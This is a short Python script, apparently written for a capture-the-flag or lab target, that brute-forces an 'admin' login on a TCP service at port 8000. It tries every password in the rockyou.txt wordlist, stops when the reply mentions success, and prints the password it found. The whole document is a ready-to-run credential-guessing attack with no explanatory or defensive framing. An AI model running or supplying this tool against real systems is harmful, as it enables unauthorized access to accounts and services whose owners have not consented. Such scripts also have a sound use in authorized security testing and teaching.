import socket

# Configuration
target_ip = "<target-ip>"
target_port = 8000
password_wordlist = "/usr/share/wordlists/rockyou.txt"

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        response = client_socket.recv(1024).decode()
        if "Password:" in response:
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode()
            if "success" in response.lower() or "admin" in response.lower():
                print(f"✅ Password FOUND: {password}")
                return True
        return False
    except:
        return False
    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r", encoding="latin-1") as file:
        for password in file:
            password = password.strip()
            if connect_and_send_password(password):
                break

if __name__ == "__main__":
    fuzz_passwords()
